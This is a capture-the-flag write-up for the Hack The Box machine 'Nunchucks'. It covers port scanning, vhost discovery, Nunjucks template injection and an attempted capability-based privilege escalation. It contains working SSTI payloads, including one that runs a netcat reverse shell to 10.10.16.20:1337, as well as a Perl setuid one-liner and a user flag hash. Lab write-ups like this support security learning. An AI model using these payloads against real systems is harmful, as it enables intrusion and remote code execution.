# Nunchucks 
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/07260abf-8e6f-49eb-86fa-aefb6913930f)


## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~/Downloads]
└─$ nmap -p- -sVC 10.10.11.122 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 03:41 PDT
Nmap scan report for 10.10.11.122
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.76 seconds
```

1. Based from the nmap results, the machine runs a web applicatoin and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0e52b16f-9ae9-402b-8691-25f5011ffc30)


2. Trying every feature, resulting to nothing interesting. Even when tried to register account, they said it's closed already.
3. Running **dirbuster** found nothing interesting again.
4. But checking the subdomain, by running **gobuster**, found one domain that should be our interest --> `store.nunchucks.htb`.

#### NOTES:
```
Since nunchuck is https --> hence need to add -k

gobuster vhost -u host -w wordlists -k
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3bf45dc4-6fcb-44db-b099-ca71aaf0a13d)


5. Long story short found the vuln at the **Notify Me** textbox --> SSTI.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6408bf16-245e-448e-8c0f-6418f281c85e)


6. The vuln is SSTI as you can see the webserver execute the regex operation.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/22c82c7c-0e2e-4059-b1aa-58148a6c2447)


7. Great! Seems this is our foothold.
8. Anyway, after ran another ssti for flask, it shows nothing.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/16c5bb63-e8f4-4945-a106-1824e140aabb)


9. Not took me long to realized that the template engine used probably is **Nunjucks**. It's easy to guess based from the chall title and programming language used in this webapp.

> WAPPALYZER RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/63734eda-2187-4acd-8dfc-d3889acce18b)


10. Did a little outsource about **Nunjucks Template Engine** exploit.

```
http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3e2f4c37-6109-4a83-bada-54e895ef8553)


11. But we need to revised a little bit.

> REVISED

```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@gmail.com
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b9203ea2-0ebb-48f5-ae52-516ac4c9335d)


12. Let's spawn reverse shell with our template payload. Here's the full payload:

> PAYLOAD

```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.20 1337 >/tmp/f')\")()}}@gmail.com
```

#### NOTE:

```
Use the previous request we sent to repeater then change the JSON email parameter value, it won't work if we tried to catch the request from 0 again.
```

> RESULT - GOT RCEEEEE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab0062ae-ff95-4cd2-a6a5-a4b52f5232ee)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/987824cc-b833-48f5-9811-353167867a9b)


## USER FLAG

```
341e52e2c4724a2da3b7af04a076458b
```

13. Actually it took me a while to get the root flag, until I realized the capabilities for perl is vulnerable here.

> To check cap --> run --> getcap -r /

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4661780-cafc-4725-85f5-46c9dae72057)


14. To do privesc we can use this --> `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`.
15. Anyway dunno why it can't.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/845ae0e5-da06-40b3-b928-468cf63c4d40)


16. Even to get the root flag still can't.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab4e90d8-637b-4db4-afb7-816f8dbe28a8)


17. Interesting.
